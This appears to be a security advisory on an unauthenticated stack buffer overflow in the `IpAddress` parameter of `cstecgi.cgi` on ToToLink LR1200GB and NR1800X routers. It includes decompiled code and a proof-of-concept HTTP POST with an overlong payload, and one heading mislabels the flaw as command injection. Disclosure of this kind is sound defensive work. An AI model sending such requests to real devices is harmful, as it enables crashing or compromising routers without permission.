# Buffer Overflow Vulnerability in `IpAddress`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink LR1200GB & NR1800X Router                           |
| Firmware Version     | **V9.1.0u.6619_B20230130** for LR1200GB and **V9.1.0u.6681_B20230703** for NR1800X |
| Vulnerability Type   | **Stack Buffer Overflow**                                    |
| Vulnerable Component | `cstecgi.cgi` (handling of `IpAddress` parameter via `websGetVar` and `strcpy`) |
| Prerequisites        | Remote access to the device's web interface (no authentication required) |

2. Exploitation Path

```c
// cstecgi.cgi
int __fastcall setDefResponse(int a1, int a2)
{
  ...
  _DWORD v15[9]; // [sp+18h] [-24h] BYREF
  memset(v15, 0, 32);
  ...
  v6 = JsonConf;
  if ( JsonConf )
  {
    Var = websGetVar(JsonConf, "IpAddress", (int)&byte_439510);
    strcpy(v15, Var);
    cJSON_Delete(v6);
  }
  ...
}
```

3. **Vulnerable Binaries:** `cstecgi.cgi`.
4. 0-Day Command Injection Exploitation Path: In `cstecgi.cgi`, at line 11, `Var = websGetVar(JsonConf, "IpAddress", (int)&byte_439510)` receives data without any length restriction and is directly passed to line 12, `strcpy(v15, Var)`, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerabilities:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: curl/7.81.0
Accept: */*
Content-Type: application/json
Content-Length: 80
Connection: close

{
  "IpAddress": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}
```